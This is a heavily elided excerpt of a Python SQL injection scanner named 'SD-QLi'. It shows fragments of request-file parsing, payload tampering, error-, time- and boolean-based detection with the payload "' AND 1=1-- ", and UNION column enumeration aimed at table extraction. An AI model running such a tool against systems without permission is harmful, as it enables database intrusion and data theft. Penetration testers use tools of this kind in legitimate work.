...
class SDQLi:
    ...
    def _apply_tamper(self, payload):
        ...
        # Improved tamper logic for generic scenarios
        if "'" in payload:
    ...
    def parse_request_file(file_path):
        """Parses a raw HTTP request file (Burp-style)"""
        try:
            ...
            for line in lines[1:]:
                ...
                if not is_body:
                    if ':' in line:
                        ...
                        if key.lower() == 'host': host = val.strip()
                else:
                    body += line
            ...
            print(f"{Colors.RED}[!] Error parsing request file: {e}{Colors.END}")
            return None
    ...
    ███████║██████╔╝       ╚██████╔╝███████╗██║
    ╚══════╝╚═════╝         ╚══▀▀═╝ ╚══════╝╚═╝
    {Colors.END}                 {Colors.BOLD}v1.3 - SD-QLi (Advanced Edition){Colors.END}
        """
        print(banner)
                        ...
                        if re.search(error_regex, r.text, re.IGNORECASE):
                            with self.lock:
                                vuln = {
                                    ...
                                    'param': param_name,
                                    'payload': payload,
                                    'full_payload': current_params[param_name],
                                    'url': r.url if self.method == 'GET' else self.url
                                }
                                if vuln not in self.results['vulnerabilities']:
                                    self.results['vulnerabilities'].append(vuln)
                                    print(f" {Colors.GREEN}[+]{Colors.END} Found on {Colors.CYAN}{param_name}{Colors.END}: {db_type} Error-based")
                            return True
            except: pass
            finally:
            ...
            try:
                ...
                if elapsed >= 2:
                    with self.lock:
                        ...
                        self.results['vulnerabilities'].append(vuln)
                        print(f" {Colors.GREEN}[+]{Colors.END} Found on {Colors.CYAN}{param_name}{Colors.END}: {db} Time-based")
                    return True
            except: pass
            finally:
            ...
            if len(r_true.text) != len(r_false.text):
                with self.lock:
                    vuln = {
                        ...
                        'param': param_name,
                        'payload': "' AND 1=1-- ",
                        'full_payload': true_params[param_name]
                    }
                    self.results['vulnerabilities'].append(vuln)
                    print(f" {Colors.GREEN}[+]{Colors.END} Found on {Colors.CYAN}{param_name}{Colors.END}: Boolean-blind")
                return True
        except: pass
    ...
    def find_union_columns(self, param_name, current_params):
        ...
        print(f"[*] Testing {Colors.YELLOW}ORDER BY{Colors.END} column discovery on {Colors.CYAN}{param_name}{Colors.END}...")
        original_val = current_params[param_name]
        ...
        if column_count > 0:
            print(f" {Colors.GREEN}[+]{Colors.END} Found {Colors.CYAN}{column_count}{Colors.END} columns.")
            
            print(f"[*] Testing {Colors.YELLOW}UNION SELECT{Colors.END} reflection points...")
            ...
            try:
                ...
                if reflected_indices:
                    print(f" {Colors.GREEN}[+]{Colors.END} Reflected columns: {Colors.CYAN}{reflected_indices}{Colors.END}")
                    ...
                    print(f"[*] Testing intelligent table enumeration...")
    ...
    def display_summary(self):
        ...
        if 'union_info' in self.results:
            ...
            print(f"  - DB Records:    Table discovery and extraction completed.")
